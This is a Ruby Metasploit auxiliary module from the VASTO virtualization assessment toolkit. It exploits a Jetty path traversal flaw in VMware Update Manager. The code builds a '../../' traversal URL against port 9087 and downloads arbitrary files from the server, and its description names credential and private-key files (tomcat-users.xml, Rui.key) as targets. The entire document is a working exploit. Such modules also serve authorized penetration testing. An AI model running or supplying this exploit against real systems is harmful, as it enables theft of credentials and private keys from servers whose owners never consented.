#################################################################
# 								#
#		This module is part of VASTO			#
#			Version 0.4				#
#		Virtualization ASsessment TOolkit		#
#								#
#################################################################
require 'msf/core'
require "rexml/document"
require "open-uri"

class Metasploit3 < Msf::Auxiliary  
  # Exploit mixins should be called first
  include Msf::Exploit::Remote::HttpClient
  # Scanner mixin should be near last
  include Msf::Auxiliary::Scanner
  include REXML

  
  def initialize
    super(
			'Name'        => 'UpdateManager Path Traversal',
			'Version'     => 'UpdateManager Path Traversal 0.2',
			'Description' => 'This module exploits a validation error in Jetty to perform
					  a path traversal attack. Interesting files are
					  Program Files\VMware\Infrastructure\tomcat\conf\tomcat-users.xml
					  ProgramData\VMware\VMware VirtualCenter\SSL\Rui.key or crt',
			'Author'      => 'Claudio Criscione - c.criscione@securenetwork.it',
      			'References'	=>
				[
					[ 'URL', 'http://www.vmware.com/security/advisories/' ],
					[ 'CERT', '402580' ],	
					[ 'URL', 'http://jira.codehaus.org/browse/JETTY-1004' ]
				],
			'License'     =>  GPL_LICENSE 
    )
      
      deregister_options('VHOST')
      deregister_options('SSL')
    register_options(
      [
        Opt::RPORT(9087),
        OptBool.new('SSL', [ true, "Use SSL", false ]),
	OptString.new('FILE', [true, "What you want to retrieve, relative to the drive hosting the Update Manager", "boot.ini"]),
	OptString.new('LOCALDIR', [true, "Local directory where files are saved", "/tmp/"]),
      ], self.class)    
  end
  
  def run_host(ip)
    begin
	do_file(ip)       
    end
  end
  

    
    
   #retrieves a given file or guest
   def do_file(ip)
     begin
	ldir = datastore['LOCALDIR']
	port = datastore['RPORT']
	ssl = datastore['SSL']
	
	file = URI.escape(datastore['FILE'])

	
	#Building the url
	if(ssl)
	  baseuri = 'https://'
	else
	  baseuri = 'http://'
	end
	baseuri << ip
	baseuri << ':' + port
	baseuri << "/vci/downloads/health.xml/%3F/../../../../../../../../../"

	uri = baseuri + file	
	download_file(uri,ldir) 
	
	rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
	rescue ::OpenSSL::SSL::SSLError
	rescue ::Timeout::Error, ::Errno::EPIPE    
     end
   end
   
   
   
   #Download given file
   def download_file(uri,ldir)
     begin
	print_status("Retriving  " + uri + " to " + ldir)
	#Downloading the file
	open(uri, 
	     :content_length_proc => lambda {|t|
		if t && 0 < t
		  @size = t
	          @dstatus = 0
		end
	      },
	    :progress_proc => lambda {|s| #handling statusbar
		if((s*100 / @size) - 10  > @dstatus) #I love palindromes
		   @dstatus = (s*100 / @size)
		   print_status("#@dstatus % completed")
	       end
	     }
	  ) do |fin|
           open(ldir + "/" + URI.unescape(File.basename(uri)), "w") do |fout|
             while (buf = fin.read(8192))
               fout.write buf
             end
           end
         end
     end
   end
   
    
   
end
